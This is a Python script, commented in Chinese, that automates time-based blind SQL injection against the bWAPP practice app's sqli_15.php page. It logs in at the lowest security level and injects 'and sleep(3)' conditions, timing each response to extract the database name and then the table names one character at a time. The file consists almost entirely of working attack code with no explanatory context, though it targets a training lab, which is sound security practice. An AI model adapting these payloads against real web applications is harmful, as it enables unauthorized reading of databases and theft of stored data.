'''
bwapp sqli 时间盲注 将ip改为自己ip即可
'''
import requests
import time

ip_port = '127.0.0.1:80'
data = {
    'login' : 'aideyisu',
    'password' : 'aideyisu',
    'security_level' : '0',
    'form' : 'submit'
}

url_login = f'http://{ip_port}/login.php'
session = requests.session()
resp = session.post(url_login, data)
num = 0
max_count = 30

base_url_start = f"http://{ip_port}/sqli_15.php?title=World War Z' and"
base_url_end = f"and sleep(3) -- &action=search"

# 获取数据库长度名称`
for i in range(1, max_count) :
    url = f"{base_url_start} length(database())={i} {base_url_end}"
    start_time = time.time()
    resp =session.get(url)
    end_time = time.time()
    if  end_time - start_time > 1 :
        print(f'length of database name is {i} \n')
        num = i
        break

dbname= ''
# 获取数据库名字    
for j in range(1, num + 1) :
    for k in range(33, 128) :
        url = f"{base_url_start} ascii(substr(database(),{j},1))={k} {base_url_end}"
        start_time = time.time()
        resp =session.get(url)
        end_time = time.time()
        if  end_time - start_time > 1 :
            print(chr(k))
            dbname += chr(k)
            break
print('database name ' + dbname)

number_tables = 0
# 获取表数量
for i in range(1, max_count) :
    url = f"{base_url_start} if((select count(*) from information_schema.tables where table_schema = '{dbname}')={i},1,0) {base_url_end}"
    start_time = time.time()
    resp =session.get(url)
    end_time = time.time()
    if  end_time - start_time > 1 :
        print(f'length of {dbname} name is {i} \n')
        number_tables = i
        break

tb_names = []
# 获取表名字
for pos in range(number_tables):
    len_name = 0
    for length in range(1, max_count):
        url = f"{base_url_start} length((select table_name from information_schema.tables where table_schema = '{dbname}' limit {pos},1)) = {length} {base_url_end}"
        start_time = time.time()
        resp =session.get(url)
        end_time = time.time()
        if  end_time - start_time > 1 :
            len_name = length
            break
    print(f"发现表 长度为{len_name}")

    name = [''] * len_name
    match = 0
    for ascii_code in range(33, 128):
        for index, _ in enumerate(name, 1):
            url = f"{base_url_start} ascii(substring((select table_name from information_schema.tables where table_schema ='{dbname}' limit {pos}, 1), {index}, 1)) = {ascii_code} {base_url_end}"
            start_time = time.time()
            resp =session.get(url)
            end_time = time.time()
            if  end_time - start_time > 1 :
                name[index - 1] = chr(ascii_code)
                match += 1
                continue
        if match == len_name:
            name = ''.join(name)
            tb_names.append(name)
            print(f"发现表名 {name}")
            break

